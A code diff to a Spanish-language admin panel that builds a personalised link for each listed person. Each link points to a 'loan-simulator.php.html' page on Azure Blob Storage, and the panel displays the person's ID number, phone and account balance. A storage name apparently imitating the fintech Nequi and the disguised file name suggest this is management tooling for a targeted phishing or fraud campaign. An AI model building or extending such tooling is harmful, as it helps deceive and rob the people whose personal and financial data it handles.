@@ -309,7 +309,8 @@
 
             <div class="section-tabs">
                 <button class="tab-btn active" onclick="switchTab('clientes')">Clientes Simulador</button>
-                <button class="tab-btn" onclick="switchTab('enlaces')">Enlaces Generados</button>
+                <button class="tab-btn" onclick="switchTab('generar-enlaces')">Generar Enlaces</button>
+                <button class="tab-btn" onclick="switchTab('contenedores')">Contenedores Blob</button>
                 <button class="tab-btn" onclick="switchTab('analisis')">Análisis</button>
             </div>
 
@@ -388,6 +389,84 @@
                 </div>
             </div>
 
+            <!-- TAB: GENERAR ENLACES -->
+            <div id="tab-generar-enlaces" class="tab-content" style="display: none;">
+                <h2 style="margin-bottom: 20px;">Generador de Enlaces Personalizados</h2>
+
+                <div style="background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
+                    <h3 style="margin-bottom: 15px;">Configuración de Blob Storage</h3>
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 8px; color: var(--primary); font-weight: 600;">URL Base del Contenedor:</label>
+                        <input type="text" id="blobBaseUrl" placeholder="Ej: https://propulsornequi2026.blob.core.windows.net/mamberroi/neq/1/access-passed/"
+                               style="width: 100%; padding: 12px; background: rgba(0,212,255,0.05); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light); font-size: 13px;">
+                        <p style="font-size: 12px; color: var(--text-dim); margin-top: 8px;">💡 Pega la URL completa de tu contenedor Blob Storage</p>
+                    </div>
+                    <button onclick="saveBlobUrl()" style="background: var(--primary); color: #0a0e27; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600;">
+                        💾 Guardar URL
+                    </button>
+                </div>
+
+                <div style="background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px; border-radius: 12px;">
+                    <h3 style="margin-bottom: 20px;">Generar Enlace para Cliente</h3>
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 8px; color: var(--primary); font-weight: 600;">Seleccionar Cliente:</label>
+                        <select id="clientSelector" style="width: 100%; padding: 12px; background: rgba(0,212,255,0.05); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light);" onchange="generateLink()">
+                            <option value="">-- Selecciona un cliente --</option>
+                        </select>
+                    </div>
+
+                    <div id="generatedLinkContainer" style="display: none;">
+                        <div style="background: rgba(0,212,255,0.1); border: 1px solid var(--primary); padding: 15px; border-radius: 8px; margin-bottom: 15px;">
+                            <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 8px;">Enlace Personalizado:</p>
+                            <div style="display: flex; gap: 10px; align-items: center;">
+                                <input type="text" id="generatedLink" readonly
+                                       style="flex: 1; padding: 10px; background: rgba(0,212,255,0.05); border: 1px solid var(--border-color); border-radius: 6px; color: var(--primary); font-size: 12px; font-family: monospace; word-break: break-all;">
+                                <button onclick="copyLink()" style="background: var(--secondary); color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; white-space: nowrap; font-weight: 600;">
+                                    📋 Copiar
+                                </button>
+                            </div>
+                        </div>
+
+                        <div style="background: rgba(0,212,255,0.05); border-left: 3px solid var(--primary); padding: 15px; border-radius: 6px;">
+                            <p style="font-size: 12px; color: var(--text-light); margin-bottom: 10px;"><strong>📝 Información del Cliente:</strong></p>
+                            <div id="clientInfo" style="font-size: 12px; color: var(--text-dim);"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB: CONTENEDORES BLOB -->
+            <div id="tab-contenedores" class="tab-content" style="display: none;">
+                <h2 style="margin-bottom: 20px;">Administración de Contenedores Blob Storage</h2>
+
+                <div style="background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
+                    <h3 style="margin-bottom: 15px;">Agregar Nuevo Contenedor</h3>
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 8px; color: var(--primary); font-weight: 600;">Nombre del Contenedor:</label>
+                        <input type="text" id="containerName" placeholder="Ej: Contenedor Principal"
+                               style="width: 100%; padding: 12px; background: rgba(0,212,255,0.05); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light); margin-bottom: 15px;">
+
+                        <label style="display: block; margin-bottom: 8px; color: var(--primary); font-weight: 600;">URL Base:</label>
+                        <input type="text" id="containerUrl" placeholder="https://tu-storage.blob.core.windows.net/ruta/al/archivo/"
+                               style="width: 100%; padding: 12px; background: rgba(0,212,255,0.05); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light); margin-bottom: 15px;">
+                    </div>
+                    <button onclick="addContainer()" style="background: var(--primary); color: #0a0e27; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; margin-right: 10px;">
+                        ➕ Agregar Contenedor
+                    </button>
+                    <button onclick="testContainerConnection()" style="background: var(--secondary); color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600;">
+                        🔗 Probar Conexión
+                    </button>
+                </div>
+
+                <h3 style="margin-bottom: 20px;">Contenedores Conectados</h3>
+                <div id="containersList">
+                    <div style="padding: 30px; text-align: center; color: var(--text-dim);">
+                        <p>No hay contenedores configurados</p>
+                        <p style="font-size: 12px; margin-top: 10px;">Agrega uno arriba para comenzar</p>
+                    </div>
+                </div>
+            </div>
+
             <!-- TAB: ANALISIS -->
             <div id="tab-analisis" class="tab-content" style="display: none;">
                 <h2 style="margin-bottom: 20px;">Análisis de Simulaciones</h2>
@@ -424,6 +503,7 @@
 
     <script>
         const API_BASE_URL = 'https://bug-free-rbot-production.up.railway.app';
+        let allClients = [];
 
         // Cargar clientes al inicializar
         async function loadClients() {
@@ -434,8 +514,10 @@
                 if (data.success && data.data) {
                     // data.data es un array directo de clientes
                     const clients = Array.isArray(data.data) ? data.data : (data.data.clientes || []);
+                    allClients = clients;
                     populateClientsTable(clients);
                     populateLinksTable(clients);
+                    populateClientSelector(clients);
                     updateStats(clients);
                 }
             } catch (error) {
@@ -508,6 +590,148 @@
             window.open(`${baseUrl}/loan-simulator-personalized.html?t=${token}`, '_blank');
         }
 
+        function populateClientSelector(clients) {
+            const selector = document.getElementById('clientSelector');
+            clients.forEach(client => {
+                const option = document.createElement('option');
+                option.value = client.token_unico;
+                option.textContent = `${client.nombre_completo} (${client.numero_documento})`;
+                selector.appendChild(option);
+            });
+        }
+
+        function generateLink() {
+            const token = document.getElementById('clientSelector').value;
+            const blobUrl = localStorage.getItem('blobBaseUrl');
+
+            if (!token) {
+                alert('Selecciona un cliente');
+                return;
+            }
+
+            if (!blobUrl) {
+                alert('Configura la URL del contenedor Blob Storage primero');
+                return;
+            }
+
+            const client = allClients.find(c => c.token_unico === token);
+            const fullLink = `${blobUrl}loan-simulator.php.html?t=${token}`;
+
+            document.getElementById('generatedLink').value = fullLink;
+            document.getElementById('generatedLinkContainer').style.display = 'block';
+            document.getElementById('clientInfo').innerHTML = `
+                <p>👤 <strong>Nombre:</strong> ${client.nombre_completo}</p>
+                <p>🪪 <strong>Documento:</strong> ${client.numero_documento}</p>
+                <p>📱 <strong>Teléfono:</strong> ${client.telefono}</p>
+                <p>💰 <strong>Saldo:</strong> ${client.saldo}</p>
+            `;
+        }
+
+        function copyLink() {
+            const link = document.getElementById('generatedLink').value;
+            navigator.clipboard.writeText(link).then(() => {
+                alert('✓ Enlace copiado al portapapeles');
+            }).catch(err => {
+                console.error('Error copiando:', err);
+            });
+        }
+
+        function saveBlobUrl() {
+            const url = document.getElementById('blobBaseUrl').value.trim();
+
+            if (!url) {
+                alert('Ingresa una URL válida');
+                return;
+            }
+
+            if (!url.endsWith('/')) {
+                url += '/';
+            }
+
+            localStorage.setItem('blobBaseUrl', url);
+            alert('✓ URL guardada correctamente');
+            loadContainers();
+        }
+
+        function addContainer() {
+            const name = document.getElementById('containerName').value.trim();
+            const url = document.getElementById('containerUrl').value.trim();
+
+            if (!name || !url) {
+                alert('Ingresa nombre y URL');
+                return;
+            }
+
+            let containers = JSON.parse(localStorage.getItem('blobContainers') || '[]');
+            containers.push({ name, url, createdAt: new Date().toISOString() });
+            localStorage.setItem('blobContainers', JSON.stringify(containers));
+
+            document.getElementById('containerName').value = '';
+            document.getElementById('containerUrl').value = '';
+
+            alert('✓ Contenedor agregado');
+            loadContainers();
+        }
+
+        async function testContainerConnection() {
+            const url = document.getElementById('containerUrl').value.trim();
+
+            if (!url) {
+                alert('Ingresa una URL para probar');
+                return;
+            }
+
+            try {
+                const response = await fetch(url + 'loan-simulator.php.html', { method: 'HEAD' });
+                if (response.ok) {
+                    alert('✓ Conexión exitosa - El archivo existe');
+                } else {
+                    alert('⚠ Archivo no encontrado en esta URL');
+                }
+            } catch (error) {
+                alert('✗ Error de conexión - Verifica la URL');
+            }
+        }
+
+        function loadContainers() {
+            const containers = JSON.parse(localStorage.getItem('blobContainers') || '[]');
+            const list = document.getElementById('containersList');
+
+            if (containers.length === 0) {
+                list.innerHTML = `
+                    <div style="padding: 30px; text-align: center; color: var(--text-dim);">
+                        <p>No hay contenedores configurados</p>
+                        <p style="font-size: 12px; margin-top: 10px;">Agrega uno arriba para comenzar</p>
+                    </div>
+                `;
+                return;
+            }
+
+            list.innerHTML = containers.map((container, idx) => `
+                <div style="background: var(--bg-card); border: 1px solid var(--border-color); padding: 15px; border-radius: 8px; margin-bottom: 10px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <p style="color: var(--primary); font-weight: 600; margin-bottom: 5px;">📦 ${container.name}</p>
+                            <p style="color: var(--text-dim); font-size: 12px; word-break: break-all;">${container.url}</p>
+                            <p style="color: var(--text-dim); font-size: 11px; margin-top: 5px;">Agregado: ${new Date(container.createdAt).toLocaleDateString()}</p>
+                        </div>
+                        <button onclick="deleteContainer(${idx})" style="background: var(--secondary); color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; white-space: nowrap;">
+                            🗑️ Eliminar
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function deleteContainer(idx) {
+            if (confirm('¿Eliminar este contenedor?')) {
+                let containers = JSON.parse(localStorage.getItem('blobContainers') || '[]');
+                containers.splice(idx, 1);
+                localStorage.setItem('blobContainers', JSON.stringify(containers));
+                loadContainers();
+            }
+        }
+
         function switchTab(tabName) {
             // Ocultar todas las tabs
             document.querySelectorAll('.tab-content').forEach(tab => {
@@ -524,6 +748,15 @@
 
             // Activar el botón seleccionado
             event.target.classList.add('active');
+
+            // Cargar datos si es contenedores
+            if (tabName === 'contenedores') {
+                loadContainers();
+                const savedUrl = localStorage.getItem('blobBaseUrl');
+                if (savedUrl) {
+                    document.getElementById('blobBaseUrl').value = savedUrl;
+                }
+            }
         }
 
         function goToSection(section) {
